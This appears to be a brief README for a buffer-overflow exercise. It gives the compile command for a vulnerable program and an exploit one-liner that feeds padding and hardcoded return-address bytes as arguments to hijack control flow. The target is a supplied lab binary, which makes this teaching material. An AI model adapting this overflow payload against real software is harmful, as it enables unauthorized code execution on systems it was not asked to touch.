### Compile
```
gcc -g -o buffovf buffovf.c
```

### Exploit
```
./buffovf `echo -ne "AAAAAAAABBBBBBBBCCCCCCCCDDDDDDDDEEEEEEEE\x38\x10\x60"` `echo -ne "\x80\x06\x40"`
```

### Note
The vulnerable binary for Linux x86_64 is provided along with the code and soln.

If compiled on a different platform or architecture, this exploit may need some tweeking.
However, the general format of the exploit will remain similar.
